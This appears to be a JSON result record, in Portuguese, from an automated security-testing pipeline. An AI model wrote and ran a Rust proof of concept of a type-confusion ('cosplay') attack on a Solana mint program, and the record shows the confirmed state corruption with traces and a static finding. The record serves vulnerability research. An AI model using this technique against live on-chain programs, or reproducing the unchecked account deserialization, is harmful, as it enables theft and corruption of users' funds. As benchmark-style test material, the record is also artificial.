@@ -1,0 +1,95 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta de outro tipo teve supply/balance corrompidos",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2374,
+        "completion_tokens": 721,
+        "latency_s": 4.21
+      },
+      "raw": "{\n  \"plan\": \"O programa `mint` (Pinocchio) le e escreve supply/balance em offsets fixos (40..48 e 48..56) de accounts[0] sem verificar discriminador ou layout. O baseline usa uma conta 'ledger' legitima com esses campos zerados e chama mint com amount=100, provando que o cenario esta montado. O ataque fornece uma conta de outro tipo (ex.: uma conta 'Config' com discriminador diferente) cujos bytes 40..56 sao interpretaveis como supply/balance, e chama a mesma instrucao mint. O efeito medido e que os bytes 40..56 da conta de outro tipo foram alterados (supply/balance incrementados), demonstrando que o programa tratou dados de um tipo diferente como ledger e corrompeu o estado.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 64];\\nledger_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&0u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 100;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet ix = env.raw_ix(&ix_data, metas.clone());\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet base = env.baseline(\\\"mint legitimo em ledger\\\", &ix, &contas);\\n\\nlet cosplay_key = Pubkey::new_unique();\\nlet mut cosplay_data = vec![0u8; 64];\\ncosplay_data[0..8].copy_from_slice(&[9u8; 8]);\\ncosplay_data[40..48].copy_from_slice(&7u64.to_le_bytes());\\ncosplay_data[48..56].copy_from_slice(&3u64.to_le_bytes());\\nlet cosplay = account(&env.program_id, &cosplay_data, None);\\n\\nlet atk_metas = vec![AccountMeta::new(cosplay_key, false)];\\nlet atk_ix = env.raw_ix(&ix_data, atk_metas);\\nlet atk_contas = vec![(cosplay_key, cosplay.clone())];\\n\\nlet r = env.attack(\\\"mint em conta de outro tipo (cosplay)\\\", &atk_ix, &atk_contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &cosplay_key).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"conta de outro tipo teve supply/balance corrompidos\\\", supply == 7 + amount && balance == 3 + amount);\\n}\"\n}",
+      "plan": "O programa `mint` (Pinocchio) le e escreve supply/balance em offsets fixos (40..48 e 48..56) de accounts[0] sem verificar discriminador ou layout. O baseline usa uma conta 'ledger' legitima com esses campos zerados e chama mint com amount=100, provando que o cenario esta montado. O ataque fornece uma conta de outro tipo (ex.: uma conta 'Config' com discriminador diferente) cujos bytes 40..56 sao interpretaveis como supply/balance, e chama a mesma instrucao mint. O efeito medido e que os bytes 40..56 da conta de outro tipo foram alterados (supply/balance incrementados), demonstrando que o programa tratou dados de um tipo diferente como ledger e corrompeu o estado.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 64];\nledger_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&0u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 100;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet ix = env.raw_ix(&ix_data, metas.clone());\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet base = env.baseline(\"mint legitimo em ledger\", &ix, &contas);\n\nlet cosplay_key = Pubkey::new_unique();\nlet mut cosplay_data = vec![0u8; 64];\ncosplay_data[0..8].copy_from_slice(&[9u8; 8]);\ncosplay_data[40..48].copy_from_slice(&7u64.to_le_bytes());\ncosplay_data[48..56].copy_from_slice(&3u64.to_le_bytes());\nlet cosplay = account(&env.program_id, &cosplay_data, None);\n\nlet atk_metas = vec![AccountMeta::new(cosplay_key, false)];\nlet atk_ix = env.raw_ix(&ix_data, atk_metas);\nlet atk_contas = vec![(cosplay_key, cosplay.clone())];\n\nlet r = env.attack(\"mint em conta de outro tipo (cosplay)\", &atk_ix, &atk_contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &cosplay_key).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"conta de outro tipo teve supply/balance corrompidos\", supply == 7 + amount && balance == 3 + amount);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo em ledger",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "0064000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "f5a5fd42d16a2030",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000064000000000000000000000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint em conta de outro tipo (cosplay)",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "0064000000000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0909090909090909",
+                "digest": "2dfdf180d0cb47b9",
+                "post": "090909090909090900000000000000000000000000000000000000000000000000000000000000006b0000000000000067000000000000000000000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta de outro tipo teve supply/balance corrompidos",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta de outro tipo teve supply/balance corrompidos"
+    }
+  ],
+  "case_id": "SSP-03-P-V1",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let supply = u64::from_le_bytes(data[40..48].try_into().unwrap());\nlet balance = u64::from_le_bytes(data[48..56].try_into().unwrap());",
+    "explanation": "Os dados da conta sao desserializados manualmente a partir de offsets fixos (40..48 e 48..56) sem qualquer discriminador de tipo ou verificacao de layout. Qualquer conta com bytes nesses offsets e aceita como se fosse o ledger esperado.",
+    "attack_hypothesis": "O atacante fornece uma conta de outro tipo cujo layout coincida parcialmente (bytes 40..56 interpretaveis como supply/balance), fazendo o programa tratar dados de um tipo diferente como se fossem o ledger e corrompendo o estado."
+  }
+}
